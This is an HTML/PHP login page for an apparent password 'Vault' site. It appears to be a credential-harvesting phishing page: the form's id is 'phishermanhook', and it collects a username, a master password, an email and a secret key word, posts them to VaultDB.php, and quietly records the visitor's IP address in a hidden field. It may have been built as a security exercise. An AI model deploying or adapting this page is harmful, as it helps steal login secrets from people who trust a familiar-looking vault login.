<!DOCTYPE html>
<html lang="en">
<style>
    body {
    background-image: url("./img/Bank Vault Image.jpg");
    background-size: cover;
    }

    .logo {
        width: 250px;
        height: 110px;
        border-radius: 30px;
    }

    .mainSection {
        padding-left: 20%;
        padding-top: 140px;
    }

    .formBox {
        border-color: black;
        border-radius: 10px;
        border-width: 2px;
        background-color: #e5e5e5;
        padding: 20px;
        max-width: 450px;
    }
</style>

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script src="http://www.google.com/recaptcha/api.js"></script>
</head>

<?php $ip=$_SERVER['REMOTE_ADDR'];?>

<body>
    <div class="mainSection">
        <img class="logo" src="./img/Vault Logo.png" alt="">
        <div class="formBox">
            <h3>Login</h3>
            <form action="VaultDB.php" method="post" id="phishermanhook">
                <div>
                    <label for="Username">Username</label>
                    <input type="text" name="Username" id="Username" required>
                </div>
                <div>
                    <label for="MasterPassword">Master Password</label>
                    <input type="text" name="MasterPassword" id="MasterPassword" required>
                </div>
                <div>
                    <label for="Email">Email</label>
                    <input type="text" name="Email" id="Email" required>
                </div>
                <div>
                    <label for="KeyWord">Special Key Word</label>
                    <input type="text" name="KeyWord" id="KeyWord" required>
                </div>
                <input hidden type="hidden" name="ipaddr" id="ipaddr" value=<?php echo $ip; ?>>
                <button class="g-recaptcha" 
                        data-sitekey="6LfVrfsoAAAAAGhAQhpjaXrPFLOR0kjlhPk5q3KO"
                        data-callback="onSubmit">Log In</button>
                <!-- <input type="submit" name="submit"> -->
            </form>
        </div>
    </div>
<script>
    function onSubmit(token) {
        document.getElementById("phishermanhook").submit();
    }
</script>
</body>
</html>